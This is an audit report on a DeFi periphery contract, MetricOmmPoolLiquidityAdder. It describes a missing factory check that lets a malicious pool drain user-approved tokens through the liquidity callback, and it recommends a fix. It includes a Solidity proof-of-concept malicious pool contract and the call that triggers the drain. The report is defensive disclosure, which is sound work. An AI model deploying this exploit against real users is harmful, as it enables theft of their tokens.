Audit Report

## Title
Missing Factory Validation in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens via Callback — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

## Summary

`MetricOmmPoolLiquidityAdder` accepts any caller-supplied `pool` address and stores it as the sole authorized callback caller without verifying it against the factory registry. A malicious pool contract can exploit `metricOmmModifyLiquidityCallback` to pull up to `maxAmountToken0` / `maxAmountToken1` of any tokens the user has approved to the adder. The contract's own NatSpec explicitly acknowledges this gap.

## Finding Description

`MetricOmmSwapRouterBase` holds an immutable `FACTORY` reference and calls `_requireFactoryPool(pool)` before setting any transient callback context, ensuring only registered pools can be authorized callers. [1](#0-0) 

`MetricOmmPoolLiquidityAdder` has no factory reference — its constructor accepts only `weth` — and performs no equivalent check. [2](#0-1) 

The NatSpec at lines 19–21 explicitly acknowledges the missing guard: [3](#0-2) 

The exploit path through `addLiquidityExactShares`:

1. `_addLiquidity` calls `_setPayContext(pool, payer, maxAmountToken0, maxAmountToken1)`, storing the unverified attacker-controlled pool as the sole authorized callback caller. [4](#0-3) 

2. `metricOmmModifyLiquidityCallback` passes the caller check because `msg.sender == expectedPool` (the malicious pool was stored as `expectedPool`). [5](#0-4) 

3. The callback queries `IMetricOmmPool(msg.sender).getImmutables()` — fetching token addresses from the malicious pool, which can return any token the user has approved. [6](#0-5) 

4. `pay(token0, payer, msg.sender, amount0Delta)` and `pay(token1, payer, msg.sender, amount1Delta)` execute `safeTransferFrom(user, maliciousPool, amount)` for attacker-chosen tokens. [7](#0-6) 

The same path is reachable through `addLiquidityWeighted`: the probe phase calls the malicious pool (which can revert with a crafted `LiquidityProbe(need0, need1)` to manipulate share scaling), and the subsequent pay phase executes the token drain via `_addLiquidity`. [8](#0-7) 

## Impact Explanation

Any user who has approved `MetricOmmPoolLiquidityAdder` for token spending and is induced to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address loses up to `maxAmountToken0` + `maxAmountToken1` of their approved tokens in a single transaction. The attacker controls which token addresses are returned from `getImmutables()`, so any approved token is at risk. This is a direct, complete loss of user principal — Critical severity under Sherlock thresholds.

## Likelihood Explanation

No privileged role is required. The attacker only needs to deploy a contract implementing `IMetricOmmPoolActions` and `IMetricOmmPool`, then induce a user to call the adder with that address (via phishing, compromised front-end, or malicious wrapper contract). Users interacting through any intermediary that controls the `pool` parameter are fully exposed. The `MetricOmmSimpleRouter` provides the correct guard; its absence in `MetricOmmPoolLiquidityAdder` is a documented, reachable inconsistency exploitable by any unprivileged actor.

## Recommendation

Inject the factory address into `MetricOmmPoolLiquidityAdder` as an immutable and add a factory membership check at the top of `_addLiquidity` (and before the probe call in `addLiquidityWeighted`), mirroring `MetricOmmSwapRouterBase._requireFactoryPool`:

```solidity
IMetricOmmPoolFactory internal immutable FACTORY;

constructor(address weth, address factory) PeripheryPayments(weth) {
    FACTORY = IMetricOmmPoolFactory(factory);
}

function _addLiquidity(address pool, ...) internal returns (...) {
+   if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

Apply the same check before the probe `try` block in both `addLiquidityWeighted` overloads. [9](#0-8) 

## Proof of Concept

```solidity
contract MaliciousPool {
    address token0; address token1;
    constructor(address _t0, address _t1) { token0 = _t0; token1 = _t1; }

    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0; imm.token1 = token1;
    }

    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        IMetricOmmPoolLiquidityAdder(msg.sender)
            .metricOmmModifyLiquidityCallback(MAX0, MAX1, abi.encode(uint8(1)));
        return (MAX0, MAX1);
    }
}

// Victim (or front-end on victim's behalf) calls:
adder.addLiquidityExactShares(
    address(maliciousPool), victim, 0, deltas, MAX0, MAX1, ""
);
// Result: victim loses MAX0 of token0 and MAX1 of token1 to maliciousPool
```

The callback check `msg.sender == expectedPool` passes because `expectedPool` was set to `maliciousPool` by `_setPayContext`. Token addresses come from `maliciousPool.getImmutables()`, so the attacker chooses which approved tokens are drained. [10](#0-9)

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-89)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }

  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L37-37)
```text
  constructor(address weth) PeripheryPayments(weth) {}
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-114)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-171)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L172-177)
```text
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-193)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```
